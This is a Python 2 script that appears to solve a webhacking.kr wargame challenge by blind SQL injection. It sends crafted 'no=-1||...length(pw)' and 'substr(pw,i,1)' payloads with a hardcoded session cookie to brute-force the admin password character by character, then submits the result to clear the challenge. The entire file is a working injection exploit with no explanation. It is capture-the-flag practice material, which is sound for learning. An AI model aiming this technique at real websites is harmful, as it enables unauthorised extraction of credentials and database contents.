#-*- coding: utf-8 -*-
import sys
import urllib2
import CookieManager

challengeUrl = "http://webhacking.kr/challenge/web/web-29/index.php"
trueCondition  = "admin password"

print "[*] Find admin password length"
passwordLength = 0
isFoundPassword = False

CookieManager.addCookie("PHPSESSID", "0eb95c9c96a3a8bc908e5d828f22cc3b")
for passwordLength in range(1, 20):
    parameters = "?no=-1||no=2%26%26length(pw)=" + str(passwordLength) + "&id=0x61646d696e&pw=guest"
    httpRequest = urllib2.Request(challengeUrl + parameters)
    httpRequest.add_header("Cookie", CookieManager.getCookie())
    
    httpConnection = None
    try:
        httpConnection = urllib2.urlopen(httpRequest)
        httpResponse = httpConnection.read()
        print "[*] Blind SQL Injection...", passwordLength
        if httpResponse.find(trueCondition) > 0:
            print "[+] FIND IT! password length is [", passwordLength, "]"
            isFoundPassword = True
            break
    except:
        raise
    finally:
        if httpConnection != None:
            httpConnection.close()

if not isFoundPassword:
    sys.exit(-1)

passwordValue = ""
print
print "[*] Find admin password"
for caretIndex in range(1, passwordLength+1):
    print
    print "[*] Blind SQL Injection...", caretIndex, "", 
    for charIndex in range(0x5b, 0x7b):
        sys.stdout.write(".")
        parameters = "?no=-1||2%26%26substr(pw," + str(caretIndex) + ",1)=" + hex(charIndex) + "&id=guest&pw=guest"
        
        httpRequest = urllib2.Request(challengeUrl+parameters)
        httpRequest.add_header("Cookie", CookieManager.getCookie())
        
        httpConnection = None
        try:
            httpConnection = urllib2.urlopen(httpRequest)
            httpResponse = httpConnection.read()
            if httpResponse.find(trueCondition) > 0:
                print 
                print "[+] FIND IT!", chr(charIndex)
                passwordValue += chr(charIndex)
                break
        except:
            raise
        finally:
            if httpConnection != None:
                httpConnection.close()

print "[+] Admin password is [", passwordValue, "]"

print
print "[*] Clear Challenge 40"
parameter = "?auth=luck_admin"

httpRequest = urllib2.Request(challengeUrl+parameter)
httpRequest.add_header("Cookie", CookieManager.getCookie())

httpConnection = None
try:
    httpConnection = urllib2.urlopen(httpRequest)
    httpResponse = httpConnection.read()
    print httpResponse
except:
    raise
finally:
    if httpConnection != None:
        httpConnection.close()
